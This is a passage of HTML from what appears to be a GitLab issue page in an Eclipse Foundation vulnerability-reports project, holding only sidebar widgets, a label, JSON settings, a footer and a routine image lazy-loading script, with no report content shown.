<span class="js-sidebar-toggle-container gl-button-text" data-is-expanded="true"><svg class="s16 js-sidebar-expand hidden" data-testid="chevron-double-lg-left-icon"><use href="/assets/icons-236e3b687d786d9dfe4709143a94d4c53b8d5a1f235775401e5825148297fa84.svg#chevron-double-lg-left"></use></svg><svg class="s16 js-sidebar-collapse " data-testid="chevron-double-lg-right-icon"><use href="/assets/icons-236e3b687d786d9dfe4709143a94d4c53b8d5a1f235775401e5825148297fa84.svg#chevron-double-lg-right"></use></svg></span>

</span>

</button></div>
<form class="issuable-context-form inline-update js-issuable-update " action="/security/vulnerability-reports/-/issues/198.json" accept-charset="UTF-8" data-remote="true" method="post"><div class="block assignee gl-mt-3" data-testid="assignee-block-container">
<div class="js-sidebar-assignees-root" data-field="issue" data-max-assignees="200">
<div class="title hide-collapsed gl-flex gl-justify-between gl-items-center !gl-mb-0">
<span class="gl-font-bold">Assignee</span>
<span class="gl-spinner-container" role="status"><span aria-hidden class="gl-spinner gl-spinner-sm gl-spinner-dark !gl-align-text-bottom"></span><span class="gl-sr-only !gl-absolute">Loading</span>
</span>
</div>
</div>

</div>
<div class="block epic" data-testid="sidebar-epic">
<div class="js-sidebar-epic-widget-root" data-can-edit="false" data-group-path="security" data-issue-id="636913" data-issue-iid="198" data-project-path="security/vulnerability-reports"></div>
</div>

<div class="js-sidebar-labels-widget-root" data-allow-label-create="" data-allow-scoped-labels="true" data-can-edit="" data-iid="198" data-issuable-type="issue" data-labels-fetch-path="/security/vulnerability-reports/-/labels.json?include_ancestor_groups=true" data-labels-manage-path="/security/vulnerability-reports/-/labels" data-project-issues-path="/security/vulnerability-reports/-/issues" data-project-path="security/vulnerability-reports" data-selected-labels="[{&quot;id&quot;:58541,&quot;title&quot;:&quot;From_ML&quot;,&quot;color&quot;:&quot;#ff0000&quot;,&quot;description&quot;:null,&quot;group_id&quot;:null,&quot;project_id&quot;:3804,&quot;template&quot;:false,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2023-04-12T12:43:09.696Z&quot;,&quot;updated_at&quot;:&quot;2023-04-12T12:43:09.696Z&quot;}]"></div>
<div class="block milestone" data-testid="sidebar-milestones">
<div class="js-sidebar-milestone-widget-root" data-can-edit="" data-issue-iid="198" data-project-path="security/vulnerability-reports"></div>
</div>
<div class="block" data-testid="iteration-container"><div class="js-sidebar-iteration-widget-root" data-can-edit="" data-group-path="security" data-issue-id="636913" data-issue-iid="198" data-project-path="security/vulnerability-reports"></div>
</div>
<div class="js-sidebar-weight-widget-root" data-can-edit="" data-issue-iid="198" data-project-path="security/vulnerability-reports"></div>

<div class="js-sidebar-due-date-widget-root"></div>
<div class="js-sidebar-time-tracking-root block">
<!-- / Fallback while content is loading -->
<div class="title hide-collapsed gl-flex gl-justify-between gl-items-center !gl-mb-0">
<span class="gl-font-bold">Time tracking</span>
<span class="gl-spinner-container" role="status"><span aria-hidden class="gl-spinner gl-spinner-sm gl-spinner-dark !gl-align-text-bottom"></span><span class="gl-sr-only !gl-absolute">Loading</span>
</span>
</div>
</div>
<div class="js-sidebar-health-status-widget-root" data-can-edit="" data-full-path="security/vulnerability-reports" data-iid="198" data-issuable-type="issue"></div>
<script id="js-confidential-issue-data" type="application/json">{"is_confidential":false,"is_editable":null}</script>
<div class="js-sidebar-confidential-widget-root"></div>

<div class="js-sidebar-participants-widget-root"></div>
</form><script class="js-sidebar-options" type="application/json">{"endpoint":"/security/vulnerability-reports/-/issues/198.json?serializer=sidebar_extras","toggleSubscriptionEndpoint":"/security/vulnerability-reports/-/issues/198/toggle_subscription","moveIssueEndpoint":"/security/vulnerability-reports/-/issues/198/move","projectsAutocompleteEndpoint":"/-/autocomplete/projects?project_id=3804","editable":"","currentUser":{},"rootPath":"/","fullPath":"security/vulnerability-reports","iid":198,"id":636913,"severity":"unknown","timeTrackingLimitToHours":false,"canCreateTimelogs":null,"createNoteEmail":null,"issuableType":"issue","directlyInviteMembers":"false","weightOptions":["None","Any",0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20],"weightNoneValue":"None","multipleApprovalRulesAvailable":null}</script>
</div>
</aside>



</main>
</div>


</div>
</div>

<div class="footer-message" style="background-color: #4c4d4e;color: #ffffff"><p>Copyright © Eclipse Foundation, Inc. All Rights Reserved.     <a style="color:#fff;" href="https://www.eclipse.org/legal/privacy.php" rel="nofollow noreferrer noopener" target="_blank">Privacy Policy</a> | <a style="color:#fff;" href="https://www.eclipse.org/legal/termsofuse.php" rel="nofollow noreferrer noopener" target="_blank">Terms of Use</a> | <a style="color:#fff;" href="https://www.eclipse.org/legal/copyright.php" rel="nofollow noreferrer noopener" target="_blank">Copyright Agent</a></p></div>
<script>
//<![CDATA[
if ('loading' in HTMLImageElement.prototype) {
  document.querySelectorAll('img.lazy').forEach(img => {
    img.loading = 'lazy';
    let imgUrl = img.dataset.src;
    // Only adding width + height for avatars for now
    if (imgUrl.indexOf('/avatar/') > -1 && imgUrl.indexOf('?') === -1) {
      const targetWidth = img.getAttribute('width') || img.width;
      imgUrl += `?width=${targetWidth}`;
    }
    img.src = imgUrl;
    img.removeAttribute('data-src');
    img.classList.remove('lazy');
    img.classList.add('js-lazy-loaded');
    img.dataset.testid = 'js-lazy-loaded-content';
  });
}

//]]>
</script>
<script>
//<![CDATA[
gl = window.gl || {};
gl.experiments = {};


//]]>
</script>

</body>
</html>

